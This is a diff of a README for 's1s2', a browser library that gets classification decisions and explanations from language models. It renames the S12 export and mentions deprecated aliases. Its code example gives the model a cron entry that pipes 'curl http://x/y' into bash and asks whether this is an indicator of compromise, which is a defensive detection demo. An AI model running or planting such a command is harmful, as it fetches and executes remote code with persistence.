@@ -5,17 +5,17 @@
 Typed decisions from one forward pass of a language model, in the browser, with the probability and the margin of each answer, and text generation on the same weights when you want an explanation.
 
 ```js
-import { S12 } from "s1s2";
+import { S1S2 } from "s1s2";
 
-const kk = await S12.load({ manifest: "manifests/ct0-alias3-micro-1026.json" });    // picks a runtime for this device
-const s = await kk.decide({
+const model = await S1S2.load({ manifest: "manifests/ct0-alias3-micro-1026.json" });    // picks a runtime for this device
+const s = await model.decide({
   input: "path: /etc/cron.d/x\ncontent: * * * * * curl http://x/y | bash",
   questions: [{ name: "ioc", type: "predicate", instructions: "Is this an indicator of compromise?" }],
   // evidence: { requirement: "..." },  // packages with an evidence head: s.evidence = the sentence that shows it
 });
 const { probability, margin } = s.answers[0];                // P(true), and p(1st) - p(2nd)
 const why = await s.generate("Explain the decision in two sentences.", { maxNewTokens: 96 });  // same weights
-await s.dispose(); await kk.dispose();
+await s.dispose(); await model.dispose();
 ```
 
 ## What it is
@@ -26,6 +26,7 @@ await s.dispose(); await kk.dispose();
 - Runtimes: ONNX Runtime Web (GenAI graphs and plain decoders), transformers.js, WebLLM and LiteRT.js, plus onnxruntime-node in Node.
 - It reads **S1S2 packages**: a manifest that pins every file by sha256 and describes the prompt layout, markers, readouts and heads. The library and the format share the name; the format is specified in [`spec/`](spec/s1s2-package.md).
 - Head formats it reads: Kev `head.pt`, GGUF decision heads, alias3-web `head.bin`, d3 / pplx linear readouts, JEV, transformers `DecisionConfig` and Clef joint heads. [`converters/heads/`](converters/heads) converts each one and writes a fidelity record against that format's own reference code.
+- Renamed from s12: the `S12` export and manifests with `schema: "s12.manifest/1"` still work, as deprecated aliases of `S1S2` and `"s1s2.manifest/1"`.
 
 ## Status: alpha
 
